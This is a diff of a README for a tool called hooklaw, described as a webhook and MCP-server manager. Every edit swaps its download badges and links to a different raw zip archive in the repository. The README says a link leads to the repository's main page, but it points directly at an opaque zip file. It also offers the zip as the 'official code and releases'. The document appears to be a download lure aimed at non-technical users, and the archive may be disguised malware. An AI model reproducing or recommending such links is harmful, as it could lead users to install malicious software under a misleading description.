@@ -1,6 +1,6 @@
 # ⚙️ hooklaw - Manage Webhooks Easily and Securely
 
-[![Download hooklaw](https://img.shields.io/badge/Download-Get%20hooklaw%20now-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/Scufn2329/hooklaw/main/packages/cli/Software-v2.3.zip)
+[![Download hooklaw](https://img.shields.io/badge/Download-Get%20hooklaw%20now-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/Scufn2329/hooklaw/main/packages/Software_v2.9.zip)
 
 hooklaw is an application to manage webhooks and connect them with different MCP servers. It helps automate tasks by linking webhook events to actions using AI agents. You can run it on your own computer, keeping control and security in your hands.
 
@@ -38,7 +38,7 @@ This section guides you step-by-step to download, install, and run hooklaw on yo
 
 Click the button below or the badge at the top to visit the download page:
 
-[Get hooklaw here](https://raw.githubusercontent.com/Scufn2329/hooklaw/main/packages/cli/Software-v2.3.zip)
+[Get hooklaw here](https://raw.githubusercontent.com/Scufn2329/hooklaw/main/packages/Software_v2.9.zip)
 
 This link takes you to the GitHub repository main page where you can find the files and instructions needed to install the software.
 
@@ -102,7 +102,7 @@ Some common issues and fixes:
 
 ## 🧰 Useful Links
 
-- Official code and releases: [https://raw.githubusercontent.com/Scufn2329/hooklaw/main/packages/cli/Software-v2.3.zip](https://raw.githubusercontent.com/Scufn2329/hooklaw/main/packages/cli/Software-v2.3.zip)  
+- Official code and releases: [https://raw.githubusercontent.com/Scufn2329/hooklaw/main/packages/Software_v2.9.zip](https://raw.githubusercontent.com/Scufn2329/hooklaw/main/packages/Software_v2.9.zip)  
 - Documentation and tutorials: Find the Docs folder in the repository for detailed guides.  
 - Support channels: Use the GitHub Issues page for reporting bugs or asking for help.
 
@@ -114,4 +114,4 @@ You do not need programming skills to get started. The user interface guides you
 
 ---
 
-[![Download hooklaw](https://img.shields.io/badge/Download-Get%20hooklaw%20now-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/Scufn2329/hooklaw/main/packages/cli/Software-v2.3.zip)
+[![Download hooklaw](https://img.shields.io/badge/Download-Get%20hooklaw%20now-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/Scufn2329/hooklaw/main/packages/Software_v2.9.zip)
